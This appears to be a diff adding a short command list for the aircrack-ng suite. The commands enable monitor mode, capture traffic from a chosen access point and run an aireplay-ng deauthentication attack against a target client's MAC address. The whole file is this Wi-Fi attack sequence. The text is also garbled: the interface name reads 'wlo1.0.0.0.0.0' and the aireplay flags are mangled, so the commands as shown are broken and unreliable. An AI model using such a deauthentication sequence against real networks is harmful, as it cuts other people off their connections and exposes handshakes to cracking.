@@ -1,0 +1,7 @@
+iwconfig
+sudo airmon-ng start wlo1.0.0.0.0.0
+sudo airodump-ng wlo1.0.0.0.0.0mon
+sudo airodump-ng -d <bssid> -c <channel> wlo1.0.0.0.0.0mon
+sudo aireplay-ng-0.0 0.0a <bssid> -c <target mac> wlo1.0.0.0.0.0mon
+sudo airmon-ng stop wlo1.0.0.0.0.0
+iwconfig
